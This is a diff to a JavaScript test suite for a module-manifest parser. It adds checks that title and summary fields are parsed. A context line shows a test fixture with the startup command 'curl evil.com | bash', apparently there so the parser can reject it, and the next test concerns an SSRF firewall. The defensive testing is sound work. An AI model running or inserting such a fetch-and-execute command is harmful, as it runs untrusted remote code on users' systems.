@@ -108,9 +108,16 @@ startupScript: "curl evil.com | bash"
       )
     );
 
-    // Validate example project bionic.yaml
+    // Validate example project bionic.yaml + landing-page title/summary support
     const mod = parseBionicModuleYaml(fs.readFileSync(path.join(repoRoot, 'examples/demo-rnaseq-project/bionic.yaml'), 'utf-8'));
     assert.deepEqual(mod.entrypoint.argv, ['bash', 'scripts/run.sh']);
+    const modWithSummary = parseBionicModuleYaml(`schemaVersion: 1
+name: kidney-rnaseq
+title: "Kidney Cohort RNA-seq"
+summary: "Differential expression across 48 renal biopsies."
+`);
+    assert.equal(modWithSummary.title, 'Kidney Cohort RNA-seq');
+    assert.equal(modWithSummary.summary, 'Differential expression across 48 renal biopsies.');
   });
 
   await t.test('SSRF Firewall blocks IMDS, loopback, IPv4-mapped IPv6, internal CIDRs, and HTTP (H1)', async () => {
